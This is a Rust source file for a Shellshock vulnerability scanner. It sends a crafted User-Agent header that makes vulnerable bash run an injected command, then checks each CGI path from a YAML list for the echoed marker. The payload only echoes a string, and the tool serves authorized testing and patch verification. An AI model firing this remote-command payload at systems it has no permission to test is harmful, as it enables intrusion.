use clap::Parser;
use log::{error, info, warn};
use reqwest::Client;
use serde::Deserialize;
use std::{collections::HashMap, fs};
use tokio::time::{timeout, Duration};

const SHELLSHOCK_HEADER: &str = "() { :; }; echo; echo; /bin/bash -c 'echo shellshocked'";
const TIMEOUT_SECS: u64 = 5;

mod arguments;

#[derive(Deserialize, Debug)]
struct ShellshockPaths(HashMap<String, Vec<String>>);

#[tokio::main]
async fn main() {
    init_logger();

    let args: arguments::Arguments = arguments::Arguments::parse();
    let client: Client = Client::new();
    let content: String = match fs::read_to_string(&args.vuln_file) {
        Ok(c) => c,
        Err(e) => {
            error!("Failed to read {}: {}", &args.vuln_file, e);
            return;
        }
    };
    let paths: ShellshockPaths = match serde_yaml::from_str(&content) {
        Ok(p) => p,
        Err(e) => {
            error!("Failed to parse YAML: {}", e);
            return;
        }
    };

    for (_category, endpoints) in paths.0 {
        for path in endpoints {
            let url = format!("{}{}", args.uri.trim_end_matches('/'), path.trim());
            match timeout(Duration::from_secs(TIMEOUT_SECS), scan_url(&client, &url)).await {
                Ok(Ok(true)) => info!("vulnerable: {}", url),
                Ok(Ok(false)) => error!("failed: {}", url),
                Ok(Err(e)) => error!("error: {} - {}", url, e),
                Err(_) => warn!("timeout: {}", url),
            }
        }
    }
}

async fn scan_url(client: &Client, url: &str) -> Result<bool, reqwest::Error> {
    let res: reqwest::Response = client
        .get(url)
        .header("User-Agent", SHELLSHOCK_HEADER)
        .send()
        .await?;

    let text: String = res.text().await?;

    Ok(text.contains("shellshocked"))
}

fn init_logger() {
    env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or("info"),
    )
    .init();
}
